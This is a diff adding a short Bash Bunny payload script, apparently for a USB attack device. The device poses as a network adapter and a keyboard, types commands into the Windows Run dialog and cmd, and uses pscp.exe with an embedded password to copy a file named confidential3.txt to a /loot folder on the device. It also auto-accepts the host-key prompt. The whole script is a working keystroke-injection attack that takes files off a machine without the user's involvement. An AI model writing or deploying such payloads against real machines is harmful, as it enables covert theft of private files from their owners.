@@ -1,0 +1,29 @@
+#!/bin/bash
+# Title: RNDIS + HID SCP (No Prompt)
+# Description: Uses PuTTY's pscp.exe to copy a file to the Bash Bunny without password prompt.
+
+# Set attack modes
+ATTACKMODE RNDIS_ETHERNET HID
+
+# Wait for Windows to detect Bunny as network + keyboard
+LED SETUP
+sleep 10
+
+# Open Windows Run dialog
+QUACK GUI r
+sleep 1
+
+# Launch CMD
+QUACK STRING cmd
+QUACK ENTER
+sleep 1
+
+# Type the PSCP command with embedded password
+QUACK STRING pscp.exe -P 22 -pw YOUR_PASSWORD "C:\Users\barto\Desktop\test\confidential3.txt" root@172.16.64.1:/loot
+QUACK ENTER
+sleep 1
+QUACK y
+
+
+# Finish
+LED FINISH
